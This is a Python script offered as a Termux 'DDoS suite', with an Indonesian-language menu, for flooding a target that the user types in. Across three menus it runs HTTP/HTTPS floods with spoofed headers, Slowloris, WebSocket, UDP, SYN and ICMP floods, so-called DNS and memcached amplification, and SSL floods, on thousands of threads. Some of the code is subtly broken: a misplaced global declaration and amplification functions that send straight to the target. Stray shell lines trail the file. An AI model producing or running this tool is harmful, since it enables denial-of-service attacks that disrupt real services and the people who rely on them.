#!/usr/bin/env python3
# OSKAC REX ENTERPRISE - TERMUX DDoS SUITE v10K
# Menu 1 | 2 | 3 | Multi-Protocol | Zero Filter

import os, sys, time, random, threading, socket, ssl, requests, json, hashlib
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back, Style
import http.client, urllib.parse, asyncio, aiohttp

init(autoreset=True)

# ========== KONFIGURASI ==========
THREADS = 1000
TIMEOUT = 2
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'
]

# ========== HEADER ==========
def banner():
    os.system('clear')
    print(Fore.RED + '''
╔══════════════════════════════════════════════════════════════╗
║   ██████╗ ███████╗██╗  ██╗     ██████╗  ██████╗ ███████╗    ║
║   ██╔══██╗██╔════╝╚██╗██╔╝     ██╔══██╗██╔══██╗██╔════╝    ║
║   ██████╔╝█████╗   ╚███╔╝█████╗██║  ██║██║  ██║███████╗    ║
║   ██╔══██╗██╔══╝   ██╔██╗╚════╝██║  ██║██║  ██║╚════██║    ║
║   ██║  ██║███████╗██╔╝ ██╗     ██████╔╝██████╔╝███████║    ║
║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚══════╝    ║
║                    TERMUX DDoS SUITE v10K                    ║
║              OSKAC REX ENTERPRISE | ZERO FILTER              ║
╚══════════════════════════════════════════════════════════════╝
    ''')
    print(Fore.CYAN + '[1] HTTP/HTTPS MASS FLOOD (Layer 7)')
    print(Fore.YELLOW + '[2] UDP/TCP AMPLIFICATION (Layer 3/4)')
    print(Fore.MAGENTA + '[3] ALL-IN-ONE ANNIHILATION (10K Threads)')
    print(Fore.WHITE + '════════════════════════════════════════════════════════')
    print(Fore.RED + '[0] EXIT')

# ========== MENU 1: HTTP/HTTPS MASS FLOOD ==========
def menu1_http_flood():
    os.system('clear')
    print(Fore.CYAN + '[MENU 1] HTTP/HTTPS MASS FLOOD (Layer 7)')
    target = input(Fore.WHITE + 'Target URL (https://target.com): ')
    duration = int(input('Durasi (detik, 0 = unlimited): ') or 0)
    
    print(Fore.GREEN + f'\n[+] Menyerang {target} dengan {THREADS} thread...')
    
    # HTTP Flood dengan requests
    def http_attack():
        session = requests.Session()
        while True:
            try:
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
                payload = 'X' * 65535
                session.post(target, data=payload, headers=headers, timeout=TIMEOUT)
                session.get(target + f'?cache={random.randint(1,999999)}', headers=headers)
            except:
                pass
    
    # Slowloris
    def slowloris_attack():
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc
        port = 443 if parsed.scheme == 'https' else 80
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if port == 443:
                    sock = ssl.wrap_socket(sock)
                sock.connect((host, port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                for i in range(500):
                    sock.send(f"X-Header-{i}: {random.randint(1,999999)}\r\n".encode())
                    time.sleep(0.1)
            except:
                pass
    
    # WebSocket flood
    def ws_attack():
        try:
            import websocket
            ws = websocket.WebSocket()
            ws.connect(target.replace('https', 'wss').replace('http', 'ws'))
            while True:
                ws.send('X' * 65535)
        except:
            pass
    
    for _ in range(THREADS):
        threading.Thread(target=http_attack, daemon=True).start()
        threading.Thread(target=slowloris_attack, daemon=True).start()
        threading.Thread(target=ws_attack, daemon=True).start()
    
    if duration > 0:
        time.sleep(duration)
        print(Fore.RED + '[!] Attack finished')
    else:
        while True: time.sleep(1)

# ========== MENU 2: UDP/TCP AMPLIFICATION ==========
def menu2_udp_tcp():
    os.system('clear')
    print(Fore.YELLOW + '[MENU 2] UDP/TCP AMPLIFICATION (Layer 3/4)')
    target_ip = input(Fore.WHITE + 'Target IP: ')
    port = int(input('Port (default 80): ') or 80)
    duration = int(input('Durasi (detik, 0 = unlimited): ') or 0)
    
    print(Fore.GREEN + f'\n[+] UDP/TCP flooding {target_ip}:{port}')
    
    # UDP flood
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b'X' * 65500
        while True:
            try:
                sock.sendto(data, (target_ip, port))
                sock.sendto(data, (target_ip, 443))
                sock.sendto(data, (target_ip, 8080))
            except:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # TCP SYN flood (raw socket - butuh root)
    def tcp_syn_flood():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            # Fallback ke TCP connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                sock.connect((target_ip, port))
                sock.send(b'SYN' * 1024)
                sock.close()
            except:
                pass
    
    # ICMP flood
    def icmp_flood():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' + b'X' * 1024
            while True:
                sock.sendto(packet, (target_ip, 0))
        except:
            pass
    
    for _ in range(THREADS):
        threading.Thread(target=udp_flood, daemon=True).start()
        threading.Thread(target=tcp_syn_flood, daemon=True).start()
        threading.Thread(target=icmp_flood, daemon=True).start()
    
    if duration > 0:
        time.sleep(duration)
        print(Fore.RED + '[!] Attack finished')
    else:
        while True: time.sleep(1)

# ========== MENU 3: ALL-IN-ONE 10K THREADS ==========
def menu3_all_in_one():
    os.system('clear')
    print(Fore.MAGENTA + '[MENU 3] ALL-IN-ONE ANNIHILATION (10.000 Threads)')
    target = input(Fore.WHITE + 'Target URL/IP: ')
    port = int(input('Port (default 80): ') or 80)
    duration = int(input('Durasi (detik, 0 = unlimited): ') or 0)
    
    # Parse target
    if target.startswith('http'):
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc
        target_url = target
    else:
        host = target
        target_url = f'http://{target}'
    
    print(Fore.GREEN + f'\n[+] MELUNCURKAN 10.000 THREAD KE {host}:{port}')
    print(Fore.RED + '[!] Semua protokol aktif: HTTP | HTTPS | UDP | TCP | ICMP | Slowloris | WebSocket')
    
    attack_active = True
    
    # 1. HTTP Flood
    def http_flood():
        session = requests.Session()
        while attack_active:
            try:
                session.get(target_url + f'?{random.randint(1,999999)}', timeout=1)
                session.post(target_url, data='X'*65535, timeout=1)
            except:
                pass
    
    # 2. UDP Flood
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b'X' * 65500
        while attack_active:
            try:
                sock.sendto(data, (host, port))
                sock.sendto(data, (host, 443))
                sock.sendto(data, (host, 8080))
            except:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # 3. TCP Connect Flood
    def tcp_flood():
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((host, port))
                sock.send(b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n' + b'X'*16384)
                sock.close()
            except:
                pass
    
    # 4. Slowloris
    def slowloris():
        while attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((host, port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                for i in range(1000):
                    if not attack_active: break
                    sock.send(f"X-Header-{i}: {random.randint(1,999999)}\r\n".encode())
                    time.sleep(0.05)
            except:
                pass
    
    # 5. ICMP Flood
    def icmp_flood():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' + b'X' * 1024
            while attack_active:
                sock.sendto(packet, (host, 0))
        except:
            pass
    
    # 6. DNS Amplification
    def dns_amp():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_query = bytes.fromhex('00010000000100000000000003777777066578616d706c6503636f6d0000010001')
        while attack_active:
            try:
                sock.sendto(dns_query, (host, 53))
            except:
                pass
    
    # 7. SSL Renegotiation (HTTPS)
    def ssl_reneg():
        while attack_active:
            try:
                context = ssl.create_default_context()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((host, 443))
                ssock = context.wrap_socket(sock, server_hostname=host)
                ssock.send(b'R' * 65535)
                ssock.close()
            except:
                pass
    
    # 8. HTTP Pipeline
    def http_pipeline():
        while attack_active:
            try:
                conn = http.client.HTTPConnection(host, port, timeout=1)
                conn.request("GET", "/" + "?" + str(random.random()), headers={'Connection': 'keep-alive'})
                for _ in range(100):
                    conn.request("GET", "/?" + str(random.random()), headers={'Connection': 'keep-alive'})
                conn.getresponse()
                conn.close()
            except:
                pass
    
    # 9. WebSocket jika memungkinkan
    def ws_flood():
        try:
            import websocket
            ws_url = target_url.replace('https', 'wss').replace('http', 'ws')
            ws = websocket.WebSocket()
            ws.connect(ws_url)
            while attack_active:
                ws.send('X' * 65535)
        except:
            pass
    
    # 10. Memcached UDP Amplification
    def memcached_amp():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        while attack_active:
            try:
                sock.sendto(payload, (host, 11211))
            except:
                pass
    
    # Jalankan 10.000 thread (1.000 per protokol)
    protocols = [http_flood, udp_flood, tcp_flood, slowloris, icmp_flood, dns_amp, ssl_reneg, http_pipeline, ws_flood, memcached_amp]
    
    for protocol in protocols:
        for _ in range(1000):  # 1000 thread per protokol = 10.000 total
            threading.Thread(target=protocol, daemon=True).start()
    
    print(Fore.GREEN + '[✓] 10.000 THREAD AKTIF')
    print(Fore.RED + '[!] Tekan Ctrl+C untuk berhenti')
    
    try:
        if duration > 0:
            time.sleep(duration)
            global attack_active
            attack_active = False
            print(Fore.RED + '\n[!] Attack finished')
        else:
            while True: time.sleep(1)
    except KeyboardInterrupt:
        attack_active = False
        print(Fore.RED + '\n[!] Attack stopped')

# ========== MAIN MENU ==========
def main():
    while True:
        banner()
        choice = input(Fore.WHITE + '\nPilih menu (1/2/3/0): ')
        
        if choice == '1':
            menu1_http_flood()
        elif choice == '2':
            menu2_udp_tcp()
        elif choice == '3':
            menu3_all_in_one()
        elif choice == '0':
            print(Fore.RED + '\n[!] OSKAC REX TERMINATED')
            sys.exit()
        else:
            print(Fore.RED + '[!] Pilihan tidak valid')

if __name__ == '__main__':
    main()
EOF

# Jalankan script
python rex_menu.py